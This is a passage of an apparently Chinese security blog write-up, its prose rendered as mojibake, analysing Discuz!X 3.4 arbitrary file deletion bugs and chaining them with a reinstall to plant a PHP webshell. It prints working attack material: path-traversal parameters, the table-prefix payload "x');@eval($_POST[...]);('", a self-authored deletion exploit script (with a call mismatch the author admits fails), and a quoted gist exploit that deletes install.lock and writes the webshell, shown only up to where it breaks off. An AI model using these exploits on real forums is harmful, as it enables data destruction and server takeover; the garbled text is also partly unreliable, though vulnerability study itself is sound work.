<p>è·Ÿè¿›åˆ°<code>/source/module/home/home_spacecp.php</code>æ–‡ä»¶ï¼Œåœ¨æœ€åä¸€è¡Œä¹Ÿå¼•å…¥äº†å…¶ä»–çš„æ–‡ä»¶,å¤„ç†æ–¹å¼åŒä¸Š</p>
<pre><code class="php">require_once libfile(&#39;spacecp/&#39;.$ac, &#39;include&#39;);</code></pre>
<p>æ‰€ä»¥è¿™é‡Œå¼•å…¥çš„æ–‡ä»¶ä¸ºï¼š<code>/source/include/spacecp/spacecp_profile.php</code>ï¼Œè½¬åˆ°è¯¥æ–‡ä»¶çœ‹çœ‹ã€‚</p>
<p>åœ¨ç¬¬70è¡Œï¼Œå­˜åœ¨å¦‚ä¸‹æ¡ä»¶åˆ¤æ–­ï¼Œè¿™é‡Œä¹Ÿå°±æ˜¯é¡µé¢ä¸Šçš„ä¿å­˜æŒ‰é’®ç‚¹å‡»åè§¦å‘çš„ç›¸å…³å¤„ç†ä»£ç ï¼š</p>
<pre><code class="php">if(submitcheck(&#39;profilesubmit&#39;)) &#123;
  ......</code></pre>
<p><code>submitcheck</code>å‡½æ•°æ˜¯å¯¹profilesubmitçš„å®‰å…¨æ£€æŸ¥</p>
<pre><code class="php">function submitcheck($var, $allowget = 0, $seccodecheck = 0, $secqaacheck = 0) &#123;
    if(!getgpc($var)) &#123;
        return FALSE;
    &#125; else &#123;
        return helper_form::submitcheck($var, $allowget, $seccodecheck, $secqaacheck);
    &#125;
&#125;</code></pre>
<p>ç¬¬187è¡Œå¼€å§‹æ˜¯å¯¹æ–‡ä»¶ä¸Šä¼ çš„å¤„ç†å‡½æ•°ï¼š</p>
<pre><code class="php">    if($_FILES) &#123;
        $upload = new discuz_upload();
        foreach($_FILES as $key =&gt; $file) &#123;
    ......</code></pre>
<p>ç¬¬207è¡Œå¼€å§‹ï¼š</p>
<pre><code class="php">if(!$upload-&gt;error()) &#123;
                $upload-&gt;save();

                if(!$upload-&gt;get_image_info($attach[&#39;target&#39;])) &#123;
                    @unlink($attach[&#39;target&#39;]);
                    continue;
                &#125;
                $setarr[$key] = &#39;&#39;;
                $attach[&#39;attachment&#39;] = dhtmlspecialchars(trim($attach[&#39;attachment&#39;]));
                if($vid &amp;&amp; $verifyconfig[&#39;available&#39;] &amp;&amp; isset($verifyconfig[&#39;field&#39;][$key])) &#123;
                    if(isset($verifyinfo[&#39;field&#39;][$key])) &#123;
                        @unlink(getglobal(&#39;setting/attachdir&#39;).&#39;./profile/&#39;.$verifyinfo[&#39;field&#39;][$key]);
                        $verifyarr[$key] = $attach[&#39;attachment&#39;];
                    &#125;
                    continue;
                &#125;
                if(isset($setarr[$key]) &amp;&amp; $_G[&#39;cache&#39;][&#39;profilesetting&#39;][$key][&#39;needverify&#39;]) &#123;
                    @unlink(getglobal(&#39;setting/attachdir&#39;).&#39;./profile/&#39;.$verifyinfo[&#39;field&#39;][$key]);
                    $verifyarr[$key] = $attach[&#39;attachment&#39;];
                    continue;
                &#125;
                @unlink(getglobal(&#39;setting/attachdir&#39;).&#39;./profile/&#39;.$space[$key]);
                $setarr[$key] = $attach[&#39;attachment&#39;];
            &#125;</code></pre>
<p>æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œæ»¡è¶³<code>!$upload-&gt;error()</code>ï¼Œä¼šæ‰§è¡Œåˆ°unlinkè¯­å¥ï¼š</p>
<pre><code class="php">@unlink(getglobal(&#39;setting/attachdir&#39;).&#39;./profile/&#39;.$space[$key]);</code></pre>
<p>è¿™é‡Œçš„<code>$key</code>ï¼Œåœ¨å‰é¢<code>foreach($_FILES as $key =&gt; $file)</code>ä¸­å®šä¹‰(189è¡Œ)ã€‚<code>$space</code>åœ¨ç¬¬23è¡Œå®šä¹‰ï¼Œä¸ºç”¨æˆ·ä¸ªäººèµ„æ–™ã€‚</p>
<pre><code class="php">$space = getuserbyuid($_G[&#39;uid&#39;]);
space_merge($space, &#39;field_home&#39;);
space_merge($space, &#39;profile&#39;);</code></pre>
<p>ä¼šä»æ•°æ®åº“æŸ¥è¯¢ç”¨æˆ·ç›¸å…³çš„ä¿¡æ¯ä¿å­˜åˆ°å˜é‡$spaceä¸­ã€‚<code>birthprovince</code>å°±æ˜¯å…¶ä¸­ä¹‹ä¸€ã€‚</p>
<p>æ‰€ä»¥æ­¤æ—¶<code>$space[key] = $space[birthprovince] = &#39;../../../testfile.txt&#39;</code></p>
<p>ä¹Ÿå°±è§£é‡Šäº†å¤ç°æ—¶ä¿®æ”¹å‡ºç”Ÿæ—¥æœŸä¸ºç›®çš„æ–‡ä»¶è·¯å¾„çš„æ“ä½œã€‚</p>
<p>è¿™æ ·çš„è¯åœ¨è¿™é‡Œå°±å®Œæˆäº†æ–‡ä»¶åˆ é™¤çš„æ“ä½œã€‚</p>
<p>PSï¼šæ›´æ”¹ç”¨æˆ·ä¿¡æ¯æ—¶é€šè¿‡æäº¤è¡¨å•äº‹æ—¶æŠ“åŒ…å¯ä»¥çœ‹åˆ°å„å‚æ•°åç§°ï¼Œå¯ä»¥è¿›è¡Œä¿®æ”¹ã€‚</p>
<h3 id="5ã€Exp"><a href="#5ã€Exp" class="headerlink" title="5ã€Exp"></a>5ã€Exp</h3><p>expæ”¹äº†åŠå¤©ä¹Ÿæ²¡æœ‰æ”»å‡»æˆåŠŸï¼Œæ‰¾äº†å…¬å¼€çš„expä¹Ÿä¸æˆåŠŸï¼Œä¸çŸ¥é“æ˜¯expé—®é¢˜è¿˜æ˜¯ç¯å¢ƒé—®é¢˜ã€‚</p>
<pre><code class="python">import requests
import re
import os

def check_url(target_url):
    parameter = target_url.split(&#39;/&#39;)
    if parameter[-1] != &quot;home.php&quot;:
            print(&quot;[*] Please make sure the url end with &#39;home.php&#39;&quot;)
            exit()

def get_cookie(target_url):
    cookie = input(&quot;[*] Please paste the cookie:&quot;).split(&#39;;&#39;)  
    cookies = &#123;&#125;
    for i in range(0,len(cookie)):
        name,value=cookie[i].strip().split(&#39;=&#39;,1)
        cookies[name] = value
    loginurl = target_url + &#39;?mod=spacecp&#39;
    text = requests.get(target_url,cookies=cookies).text
    if &#39;æ‚¨éœ€è¦å…ˆç™»å½•æ‰èƒ½ç»§ç»­æœ¬æ“ä½œ&#39; in text:
        print(&quot;[*] Login error,please check cookies!&quot;)
    else:
        return cookies


def del_file(target_url,target_file,cookies):
    loginurl = target_url + &#39;?mod=spacecp&#39;
    text = requests.get(target_url,cookies=cookies).text
    reformhash = &#39;formhash=.*?&amp;&#39;
    patternformhash = re.compile(reformhash)
    formhash = patternformhash.search(text).group()[9:17]
    print(formhash)
    # set birthprovince
    birthprovinceurl = target_url + &#39;?mod=spacecp&amp;ac=profile&#39;
    birthprovincedata =&#123;
                    &quot;birthprovince&quot;:target_file,
                    &quot;profilesubmit&quot;:&quot;1&quot;,
                    &quot;formhash&quot;:formhash
                    &#125;
    requests.post(birthprovinceurl,cookies=cookies,data=birthprovincedata)
    # upload a picture and delete the target file
    basepath = os.path.abspath(os.path.dirname(__file__))
    uploadurl = target_url + &#39;?mod=spacecp&amp;ac=profile&amp;op=base&#39;
    files = &#123;&#39;birthprovince&#39;: (&quot;pic.png&quot;,open(basepath+&#39;/1.png&#39;, &#39;rb&#39;))&#125;
    data = &#123;
        &#39;formhash&#39;:formhash,
        &#39;profilesubmit&#39;:&#39;1&#39;
        &#125;
    s=requests.post(uploadurl,cookies=cookies,data=data,files=files)
    print(s.text)
    print(&quot;[*] Deleting the file.&quot;)


def exp():
    try:
        target_url = input(&quot;[*] please input the target url(eg:http://xxxxx/home.php):&quot;)
        check_url(target_url)
        cookies,formhash = get_cookie(target_url)
        target_file = input(&quot;[*] Please input the target file:&quot;)
        del_file(target_url,target_file,cookies,formhash)
    except KeyError as e:
        print(&quot;This poc doesn&#39;t seem to work.&quot;)

if __name__ == &quot;__main__&quot;:
    exp()   </code></pre>
<h3 id="5ã€ä¿®å¤æ–¹æ³•"><a href="#5ã€ä¿®å¤æ–¹æ³•" class="headerlink" title="5ã€ä¿®å¤æ–¹æ³•"></a>5ã€ä¿®å¤æ–¹æ³•</h3><p>å¯¹æ¯”å®˜æ–¹çš„ä»£ç å˜åŠ¨ï¼Œç›´æ¥åˆ é™¤äº†å‡ æ¡unlinkè¯­å¥ï¼Œç®€å•æš´åŠ›..</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/1_5.png"></p>
<h2 id="Discuz-X-V3-4åå°ä»»æ„æ–‡ä»¶åˆ é™¤"><a href="#Discuz-X-V3-4åå°ä»»æ„æ–‡ä»¶åˆ é™¤" class="headerlink" title="Discuz!X V3.4åå°ä»»æ„æ–‡ä»¶åˆ é™¤"></a>Discuz!X V3.4åå°ä»»æ„æ–‡ä»¶åˆ é™¤</h2><h3 id="1ã€ç®€è¿°-1"><a href="#1ã€ç®€è¿°-1" class="headerlink" title="1ã€ç®€è¿°"></a>1ã€ç®€è¿°</h3><p>åå°ä»»æ„æ–‡ä»¶åˆ é™¤ï¼Œéœ€è¦æœ‰ç®¡ç†å‘˜çš„æƒé™ã€‚</p>
<h3 id="2ã€å¤ç°ç¯å¢ƒ-1"><a href="#2ã€å¤ç°ç¯å¢ƒ-1" class="headerlink" title="2ã€å¤ç°ç¯å¢ƒ"></a>2ã€å¤ç°ç¯å¢ƒ</h3><p>åŒä¸Š</p>
<h3 id="3ã€æ¼æ´å¤ç°-1"><a href="#3ã€æ¼æ´å¤ç°-1" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h3><p>ç™»é™†åå°ï¼Œè¿›å…¥è®ºå›-&gt;æ¨¡å—ç®¡ç†-&gt;ç¼–è¾‘æ¿å—ï¼Œä½¿ç”¨burpæ‹¦æˆªæäº¤çš„æ•°æ®ã€‚</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/background_files_delete/2_1.png"></p>
<p>ä¿®æ”¹è¯·æ±‚åŒ…ï¼Œæ·»åŠ å‚æ•° <code>&amp;replybgnew=../../../testfile.txt&amp;delreplybg=1</code></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/background_files_delete/2_2.png"></p>
<p>å‘é€ï¼ŒæŸ¥çœ‹æ–‡ä»¶å‘ç°è¢«åˆ é™¤ã€‚</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/background_files_delete/2_3.png"></p>
<h3 id="4ã€æ¼æ´åˆ†æ-1"><a href="#4ã€æ¼æ´åˆ†æ-1" class="headerlink" title="4ã€æ¼æ´åˆ†æ"></a>4ã€æ¼æ´åˆ†æ</h3><p>åˆ†æä¸€ä¸‹è¯¥è¯·æ±‚çš„æµç¨‹ã€‚</p>
<p>è¯·æ±‚URLï¼š<code>/dz/upload/admin.php?action=forums&amp;operation=edit&amp;fid=2&amp;replybgnew=../../../testfile.txt&amp;delreplybg=1</code></p>
<p>åœ¨<code>admin.php</code>ä¸­æ¥æ”¶äº†actionå‚æ•°ï¼Œåœ¨ç¬¬58è¡Œç»è¿‡<code>admincpfile</code>å‡½æ•°å¤„ç†åè¿”å›æ–‡ä»¶è·¯å¾„ï¼Œå¹¶åŒ…å«è¯¥æ–‡ä»¶ã€‚</p>
<pre><code class="php">    if($admincp-&gt;allow($action, $operation, $do) || $action == &#39;index&#39;) &#123;
        require $admincp-&gt;admincpfile($action);</code></pre>
<p>çœ‹ä¸€ä¸‹è¯¥å‡½æ•°çš„å¤„ç†è¿‡ç¨‹ï¼š</p>
<pre><code class="php">    function admincpfile($action) &#123;
        return &#39;./source/admincp/admincp_&#39;.$action.&#39;.php&#39;;
    &#125;</code></pre>
<p>ç»è¿‡å¤„ç†è¿”å›çš„å†…å®¹æ˜¯ï¼š<code>./source/admincp/admincp_forums.php</code>ï¼Œä¹Ÿå°±æ¥åˆ°äº†æ¼æ´å­˜åœ¨çš„åœ°æ–¹ã€‚</p>
<p>æ ¹æ®if/elseçš„åˆ¤æ–­æ¡ä»¶ï¼Œè¿›å…¥elseä¸­çš„ä»£ç ï¼š</p>
<pre><code class="php">if(!submitcheck(&#39;detailsubmit&#39;)) &#123;
  ......
&#125;
else&#123;

&#125;</code></pre>
<p>é€ æˆæ¼æ´çš„ä»£ç ï¼š</p>
<pre><code class="php">if(!$multiset) &#123;
  if($_GET[&#39;delreplybg&#39;]) &#123;
    $valueparse = parse_url($_GET[&#39;replybgnew&#39;]);
    if(!isset($valueparse[&#39;host&#39;]) &amp;&amp; file_exists($_G[&#39;setting&#39;][&#39;attachurl&#39;].&#39;common/&#39;.$_GET[&#39;replybgnew&#39;])) &#123;
      @unlink($_G[&#39;setting&#39;][&#39;attachurl&#39;].&#39;common/&#39;.$_GET[&#39;replybgnew&#39;]);
    &#125;
    $_GET[&#39;replybgnew&#39;] = &#39;&#39;;
  &#125;</code></pre>
<p><code>$multiset</code>é»˜è®¤ä¸º0ï¼Œåªè¦ä¸ç»™è¯¥å‚æ•°èµ‹å€¼å°±æ»¡è¶³æ¡ä»¶è¿›å…¥ifè¯­å¥ã€‚</p>
<p>ç¬¬äºŒä¸ªifè¯­å¥ï¼Œæ£€æŸ¥GETå‚æ•°<code>delreplybg</code>æœ‰æ²¡æœ‰å†…å®¹ï¼Œç„¶ååšäº†ä¸‹æ£€æµ‹ï¼Œæ£€æµ‹parse_urlå‡½æ•°è¿”å›çš„ç»“æœä¸­æœ‰æ²¡æœ‰hostè¿™ä¸ªå˜é‡ï¼Œæ¥ç¡®ä¿GETå‚æ•°<code>replybgnew</code>ä¸æ˜¯urlï¼Œä½†æ˜¯å¹¶ä¸å½±å“ä¼ å…¥æ–‡ä»¶è·¯å¾„ã€‚</p>
<p>è¿™é‡Œ<code>$_G[&#39;setting&#39;][&#39;attachurl&#39;</code>çš„å€¼ä¸º<code>data/attachment/</code>ï¼Œå†æ‹¼æ¥ä¸Š<code>common/</code>å’Œ<code>$_GET[&#39;replybgnew&#39;]</code>ï¼Œè¿™æ ·è·¯å¾„å°±å¯æ§äº†ã€‚é€šè¿‡unlinkè¾¾åˆ°æ–‡ä»¶åˆ é™¤çš„ç›®çš„ã€‚</p>
<h2 id="ä»»æ„æ–‡ä»¶åˆ é™¤é…åˆinstallè¿‡ç¨‹getshell"><a href="#ä»»æ„æ–‡ä»¶åˆ é™¤é…åˆinstallè¿‡ç¨‹getshell" class="headerlink" title="ä»»æ„æ–‡ä»¶åˆ é™¤é…åˆinstallè¿‡ç¨‹getshell"></a>ä»»æ„æ–‡ä»¶åˆ é™¤é…åˆinstallè¿‡ç¨‹getshell</h2><h3 id="1ã€ç®€è¿°-2"><a href="#1ã€ç®€è¿°-2" class="headerlink" title="1ã€ç®€è¿°"></a>1ã€ç®€è¿°</h3><p>è¿™ä¸ªæ–¹æ³•æ˜¯çœ‹åˆ°ä¸€ç¯‡åšå®¢åˆ†æçš„ï¼Œä¸»è¦æ˜¯åˆ©ç”¨æ–‡ä»¶åˆ é™¤æ¼æ´åˆ æ‰<code>install.lock</code>æ–‡ä»¶ï¼Œç»•è¿‡å¯¹å®‰è£…å®Œæˆçš„åˆ¤æ–­èƒ½å¤Ÿå†è¿›è¡Œå®‰è£…çš„è¿‡ç¨‹ï¼Œç„¶åå†å¡«å†™é…ç½®ä¿¡æ¯å¤„æ„ä½¿ç”¨æ„é€ çš„è¡¨å‰ç¼€åï¼Œæ—¶ä¸€å¥è¯å†™å…¥é…ç½®æ–‡ä»¶ä¸­ï¼Œgetshellã€‚</p>
<p>è¡¨å‰ç¼€ï¼š<code>x&#39;);@eval($_POST[lanvnal]);(&#39;</code></p>
<p>ä½†æ˜¯æˆ‘åœ¨ä½¿ç”¨ä¸Šé¢ç‰ˆæœ¬v3.4çš„ä»£ç æ—¶å‘ç°ï¼Œå®‰è£…å<code>install</code>ç›®å½•ä¸‹ä¸å­˜åœ¨<code>index.php</code>äº†ã€‚åˆ†æä»£ç å‘ç°ä¼šæœ‰å®‰è£…åçš„åˆ é™¤å¤„ç†ï¼Œåœ¨<code>/source/admincp/admincp_index.php</code>çš„ç¬¬14è¡Œï¼š</p>
<pre><code class="php">if(@file_exists(DISCUZ_ROOT.&#39;./install/index.php&#39;) &amp;&amp; !DISCUZ_DEBUG) &#123;
    @unlink(DISCUZ_ROOT.&#39;./install/index.php&#39;);
    if(@file_exists(DISCUZ_ROOT.&#39;./install/index.php&#39;)) &#123;
        dexit(&#39;Please delete install/index.php via FTP!&#39;);
    &#125;
&#125;</code></pre>
<p>é‚£æ˜¯ä¸æ˜¯è€ç‰ˆæœ¬å­˜åœ¨è¯¥é—®é¢˜å‘¢ï¼Ÿ</p>
<p>æˆ‘ç¿»äº†å†å²ç‰ˆæœ¬ä»£ç ï¼Œç›´åˆ°gitæäº¤çš„ç¬¬ä¸€ä¸ªç‰ˆæœ¬éƒ½æœ‰å¦‚ä¸Šçš„å¤„ç†ã€‚</p>
<p>ä½†è¿˜æ˜¯åˆ†æä¸€ä¸‹å§ï¼Œå°±å½“å­¦ä¹ äº†ã€‚</p>
<p><strong>å¯ä»¥åˆ©ç”¨çš„æ¡ä»¶ï¼š</strong>1ã€å®‰è£…åæ²¡æœ‰ç™»å½•åå°ï¼Œæ­¤æ—¶install/indexè¿˜æ²¡åˆ é™¤ 2ã€å› ä¸ºå…¶ä»–åŸå› æ²¡æœ‰åˆ é™¤</p>
<h3 id="2ã€å¤ç°ç¯å¢ƒ-2"><a href="#2ã€å¤ç°ç¯å¢ƒ-2" class="headerlink" title="2ã€å¤ç°ç¯å¢ƒ"></a>2ã€å¤ç°ç¯å¢ƒ</h3><p>åŒä¸Š</p>
<h3 id="3ã€æ¼æ´å¤ç°-2"><a href="#3ã€æ¼æ´å¤ç°-2" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h3><p>å¦‚æœå®‰è£…å<code>install/index.php</code>å› ä¸ºæŸäº›åŸå› è¿˜å­˜åœ¨ï¼Œç›´æ¥è®¿é—®ä¼šæœ‰å¦‚ä¸‹è­¦å‘Šï¼š</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/getshell_with_install/3_1.png"></p>
<p>é€šè¿‡æ–‡ä»¶åˆ é™¤æ¼æ´åˆ é™¤dataç›®å½•ä¸‹çš„<code>install.lock</code>æ–‡ä»¶å°±å¯ä»¥é‡æ–°å®‰è£…ã€‚</p>
<p>å®‰è£…è¿‡ç¨‹ä¿®æ”¹è¡¨å‰ç¼€å†…å®¹ä¸ºï¼š<code>x&#39;);@eval($_POST[lanvnal]);(&#39;</code></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/getshell_with_install/3_2.png"></p>
<p>åœ¨<code>config/config_ucenter.php</code>ä¸­å·²ç»å†™å…¥äº†webshellã€‚</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/getshell_with_install/3_3.png"></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/getshell_with_install/3_4.png"></p>
<h3 id="4ã€æ¼æ´åˆ†æ-2"><a href="#4ã€æ¼æ´åˆ†æ-2" class="headerlink" title="4ã€æ¼æ´åˆ†æ"></a>4ã€æ¼æ´åˆ†æ</h3><p>åˆ†æä¸€ä¸‹å®‰è£…é€»è¾‘ï¼Œ<code>install/index.php</code>æ–‡ä»¶çš„æ•´ä½“æµç¨‹å¦‚ä¸‹ï¼š</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/getshell_with_install/3_5.png"></p>
<p>åˆ†åˆ«æ˜¯æˆ‘ä»¬å®‰è£…çš„æ¯ä¸€æ­¥ï¼Œæ¥å—åè®®-&gt;ç¯å¢ƒæ£€æµ‹-&gt;æ˜¯å¦å®‰è£… UCenter Server-&gt;æ•°æ®åº“é…ç½®ä¿¡æ¯-&gt;å®‰è£…è¿‡ç¨‹ï¼Œç”Ÿæˆlockæ–‡ä»¶-&gt;æ£€æŸ¥</p>
<p>é—®é¢˜å‡ºåœ¨åœ¨ <code>db_init</code> çš„å¤„ç†ä¸­ï¼Œåœ¨ä»£ç ç¬¬369è¡Œï¼š</p>
<pre><code class="php">        if(DZUCFULL) &#123;
            install_uc_server();
        &#125;</code></pre>
<p>è·Ÿè¿›<code>install_uc_server</code>ï¼Œåœ¨1296è¡Œå¯ä»¥å‘ç°å¯¹configå‚æ•°æ²¡åšä»»ä½•è¿‡æ»¤ä¼ å…¥åˆ°<code>save_uc_config</code>ä¸­ï¼š</p>
<pre><code class="php">save_uc_config($config, ROOT_PATH.&#39;./config/config_ucenter.php&#39;);</code></pre>
<p>ç„¶å<code>save_uc_config</code>ä¹Ÿæ²¡åšä»»ä½•å®‰å…¨å¤„ç†ï¼Œå°±æ‹¼æ¥å‚æ•°åå†™å…¥æ–‡ä»¶ï¼š</p>
<pre><code class="php">function save_uc_config($config, $file) &#123;

    $success = false;

    list($appauthkey, $appid, $ucdbhost, $ucdbname, $ucdbuser, $ucdbpw, $ucdbcharset, $uctablepre, $uccharset, $ucapi, $ucip) = $config;

    $link = function_exists(&#39;mysql_connect&#39;) ? mysql_connect($ucdbhost, $ucdbuser, $ucdbpw, 1) : new mysqli($ucdbhost, $ucdbuser, $ucdbpw, $ucdbname);
    $uc_connnect = $link ? &#39;mysql&#39; : &#39;&#39;;

    $date = gmdate(&quot;Y-m-d H:i:s&quot;, time() + 3600 * 8);
    $year = date(&#39;Y&#39;);
    $config = &lt;&lt;&lt;EOT
&lt;?php


define(&#39;UC_CONNECT&#39;, &#39;$uc_connnect&#39;);

define(&#39;UC_DBHOST&#39;, &#39;$ucdbhost&#39;);
define(&#39;UC_DBUSER&#39;, &#39;$ucdbuser&#39;);
define(&#39;UC_DBPW&#39;, &#39;$ucdbpw&#39;);
define(&#39;UC_DBNAME&#39;, &#39;$ucdbname&#39;);
define(&#39;UC_DBCHARSET&#39;, &#39;$ucdbcharset&#39;);
define(&#39;UC_DBTABLEPRE&#39;, &#39;`$ucdbname`.$uctablepre&#39;);
define(&#39;UC_DBCONNECT&#39;, 0);

define(&#39;UC_CHARSET&#39;, &#39;$uccharset&#39;);
define(&#39;UC_KEY&#39;, &#39;$appauthkey&#39;);
define(&#39;UC_API&#39;, &#39;$ucapi&#39;);
define(&#39;UC_APPID&#39;, &#39;$appid&#39;);
define(&#39;UC_IP&#39;, &#39;$ucip&#39;);
define(&#39;UC_PPP&#39;, 20);
?&gt;
EOT;

    if($fp = fopen($file, &#39;w&#39;)) &#123;
        fwrite($fp, $config);
        fclose($fp);
        $success = true;
    &#125;
    return $success;
&#125;</code></pre>
<p>å› ä¸º <code>dbhost, dbuser </code>ç­‰å‚æ•°éœ€è¦ç”¨æ¥è¿æ¥æ•°æ®åº“ï¼Œæ‰€ä»¥åˆ©ç”¨ <code>tablepre</code> å‘é…ç½®æ–‡ä»¶å†™å…¥shellã€‚</p>
<h3 id="5ã€Exp-1"><a href="#5ã€Exp-1" class="headerlink" title="5ã€Exp"></a>5ã€Exp</h3><blockquote>
<p><a href="https://gist.github.com/j178/67f4dbd8e87cd012a7caa8752ea06e7b">https://gist.github.com/j178/67f4dbd8e87cd012a7caa8752ea06e7b</a></p>
</blockquote>
<pre><code class="python">#!/usr/bin/env python3
import base64
import random
import re
import string

import requests

sess = requests.Session()
randstr = lambda len=5: &#39;&#39;.join(random.choice(string.ascii_lowercase) for _ in range(len))

##################################################
########## Customize these parameters ############
target = &#39;http://localhost/discuzx&#39;
# login target site first, and copy the cookie here
cookie = &quot;UM_distinctid=15bcd2339e93d6-07b5ae8b41447e-8373f6a-13c680-15bcd2339ea636; CNZZDATA1261218610=1456502094-1493792949-%7C1494255360; csrftoken=NotKIwodOQHO0gdMyCAxpMuObjs5RGdeEVxRlaGoRdOEeMSVRL0sfeTBqnlMjtlZ; Zy4Q_2132_saltkey=I9b3k299; Zy4Q_2132_lastvisit=1506763258; Zy4Q_2132_ulastactivity=0adb6Y1baPukQGRVYtBOZB3wmx4nVBRonRprfYWTiUaEbYlKzFWL; Zy4Q_2132_nofavfid=1; Zy4Q_2132_sid=rsQrgQ; Zy4Q_2132_lastact=1506787935%09home.php%09misc; 7Csx_2132_saltkey=U8nrO8Xr; TMT0_2132_saltkey=E3q5BpyX; PXMk_2132_saltkey=rGBnNWu7; b4Gi_2132_saltkey=adC4r05k; b4Gi_2132_lastvisit=1506796139; b4Gi_2132_onlineusernum=2; b4Gi_2132_sendmail=1; b4Gi_2132_seccode=1.8dab0a0c4ebfda651b; b4Gi_2132_sid=BywqMy; b4Gi_2132_ulastactivity=51c0lBFHqkUpD3mClFKDxwP%2BI0JGaY88XWTT1qtFBD6jAJUMphOL; b4Gi_2132_auth=6ebc2wCixg7l%2F6No7r54FCvtNKfp1e5%2FAdz2SlLqJRBimNpgrbxhSEnsH5%2BgP2mAvwVxOdrrpVVX3W5PqDhf; b4Gi_2132_creditnotice=0D0D2D0D0D0D0D0D0D1; b4Gi_2132_creditbase=0D0D0D0D0D0D0D0D0; b4Gi_2132_creditrule=%E6%AF%8F%E5%A4%A9%E7%99%BB%E5%BD%95; b4Gi_2132_lastcheckfeed=1%7C1506800134; b4Gi_2132_checkfollow=1; b4Gi_2132_lastact=1506800134%09misc.php%09seccode&quot;
shell_password = randstr()
db_host = &#39;&#39;
db_user = &#39;&#39;
db_pw = &#39;&#39;
db_name = &#39;&#39;
#################################################

path = &#39;/home.php?mod=spacecp&amp;ac=profile&amp;op=base&#39;
url = target + path

sess.headers.update(&#123;
    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36&#39;,
    &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#39;,
    &#39;Referer&#39;: url&#125;)


# sess.proxies.update(&#123;&#39;http&#39;: &#39;socks5://localhost:1080&#39;&#125;)
# sess.proxies.update(&#123;&#39;http&#39;: &#39;http://localhost:8080&#39;&#125;)


def login(username=None, password=None):
    sess.headers.update(&#123;&#39;Cookie&#39;: cookie&#125;)


def get_form_hash():
    r = sess.get(url)
    match = re.search(r&#39;&quot;member.php\?mod=logging&amp;amp;action=logout&amp;amp;formhash=(.*?)&quot;&#39;, r.text, re.I)
    if match:
        return match.group(1)


def tamper(formhash, file_to_delete):
    data = &#123;
        &#39;formhash&#39;: (None, formhash),
        &#39;profilesubmit&#39;: (None, &#39;true&#39;),
        &#39;birthprovince&#39;: (None, file_to_delete)
    &#125;
    r = sess.post(url, files=data)
    if &#39;parent.show_success&#39; in r.text:
        print(&#39;tamperred successfully&#39;)
        return True


def delete(formhash, file):
    if not tamper(formhash, file):
        return False

    image = b&#39;iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAIAAAACUFjqAAAADUlEQVR4nGNgGAWkAwABNgABVtF/yAAAAABJRU5ErkJggg==&#39;
    data = &#123;
        &#39;formhash&#39;: formhash,
        &#39;profilesubmit&#39;: &#39;true&#39;
    &#125;
    files = &#123;
        &#39;birthprovince&#39;: (&#39;image.png&#39;, base64.b64decode(image), &#39;image/png&#39;)
    &#125;
    r = sess.post(url, data=data, files=files)
    if &#39;parent.show_success&#39; in r.text:
        print(&#39;delete &#123;&#125; successfully&#39;.format(file))
        return True


def getshell():
    install_url = target + &#39;/install/index.php&#39;
    r = sess.get(install_url)
    if &#39;å®‰è£…å‘å¯¼&#39; not in r.text:
        print(&#39;install directory not exists&#39;)
        return False

    table_prefix = &quot;x&#39;);@eval($_POST[&#123;&#125;]);(&#39;&quot;.format(shell_password)
    data = &#123;
        &#39;step&#39;: 3,
        &#39;install_ucenter&#39;: &#39;yes&#39;,
        &#39;dbinfo[dbhost]&#39;: db_host,
        &#39;dbinfo[dbname]&#39;: db_name,
        &#39;dbinfo[dbuser]&#39;: db_user,
        &#39;dbinfo[dbpw]&#39;: db_pw,
        &#39;dbinfo[tablepre]&#39;: table_prefix,
        &#39;dbinfo[adminemail]&#39;: &#39;admin@admin.com&#39;,
        &#39;admininfo[username]&#39;: &#39;admin&#39;,
        &#39;admininfo[password]&#39;: &#39;admin&#39;,
        &#39;admininfo[password2]&#39;: &#39;admin&#39;,
        &#39;admininfo[email]&#39;: &#39;admin@admin.com&#39;,
    &#125;
    r = sess.post(install_url, data=data)
    if &#39;å»ºç«‹æ•°æ®è¡¨ CREATE TABLE&#39; not in r.text:
        print(&#39;write shell failed&#39;)
        return False
    print(&#39;shell: &#123;&#125;/config/config_ucenter.php&#39;.format(target))
